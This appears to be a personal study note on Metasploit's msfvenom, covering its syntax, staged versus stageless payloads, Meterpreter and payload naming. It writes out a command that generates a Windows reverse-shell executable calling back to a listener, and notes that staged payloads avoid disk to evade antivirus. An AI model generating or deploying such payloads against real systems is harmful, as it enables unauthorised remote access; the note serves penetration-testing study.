Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells.
The standard syntax for msfvenom is as follows:
`msfvenom -p <PAYLOAD> <OPTIONS>`  

For example, to generate a Windows x64 Reverse [[Shell]] in an exe format, we could use:
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
- **-f** is used to specifies the output format.
- **-o** the output location and filename for the generated payload.
- **LHOST=** is used to specify the IP to connect back to.
- **LPORT=** is used to specify the port on the local machine to connect back to.
## Staged Payloads
Are sent in two parts. The first part is called the stager. This is  piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus. Staged payloads require a special listener -- usually the Metasploit multi/handler.
## Stageless
Are more common, these are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener. Stageless payloads tend to be easier to use and catch.

## Meterpreter
Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets.

### Payload Naming Conventions
When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
`<OS>/<arch>/<payload>`  
  
For example:
`linux/x86/shell_reverse_tcp`  

This would generate a stageless reverse shell for an x86 Linux target.
In the above examples the payload used was `shell_reverse_tcp`. This indicates that it was a _stageless_ payload. Stageless payloads are denoted with underscores (`_`). The staged equivalent to this payload would be:

`shell/reverse_tcp`